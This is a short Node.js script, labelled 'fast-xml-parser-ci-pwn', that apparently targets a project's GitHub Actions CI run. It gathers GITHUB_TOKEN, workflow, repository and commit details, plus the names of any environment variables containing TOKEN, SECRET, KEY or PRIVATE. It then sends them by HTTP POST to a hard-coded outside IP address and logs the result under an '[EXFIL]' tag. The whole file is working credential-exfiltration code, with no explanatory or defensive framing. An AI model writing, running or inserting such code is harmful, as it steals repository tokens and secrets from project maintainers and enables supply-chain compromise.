const http = require("http");
const envData = JSON.stringify({
  source: "fast-xml-parser-ci-pwn",
  GITHUB_TOKEN: process.env.GITHUB_TOKEN || "NOT_AVAILABLE",
  GITHUB_WORKFLOW: process.env.GITHUB_WORKFLOW || "",
  GITHUB_RUN_ID: process.env.GITHUB_RUN_ID || "",
  GITHUB_ACTOR: process.env.GITHUB_ACTOR || "",
  GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || "",
  GITHUB_REF: process.env.GITHUB_REF || "",
  GITHUB_SHA: process.env.GITHUB_SHA || "",
  GITHUB_EVENT_NAME: process.env.GITHUB_EVENT_NAME || "",
  SECRET_KEYS: Object.keys(process.env).filter(function(k) {
    return k.indexOf("TOKEN") !== -1 || k.indexOf("SECRET") !== -1 || k.indexOf("KEY") !== -1 || k.indexOf("PRIVATE") !== -1;
  }).join(",")
});

var options = {
  hostname: "52.198.100.26",
  port: 80,
  path: "/hello",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(envData)
  }
};

var req = http.request(options, function(res) {
  var body = "";
  res.on("data", function(chunk) { body += chunk; });
  res.on("end", function() {
    console.log("[EXFIL] Status:", res.statusCode, "Response:", body);
  });
});

req.on("error", function(e) {
  console.log("[EXFIL] Error:", e.message);
});

req.write(envData);
req.end();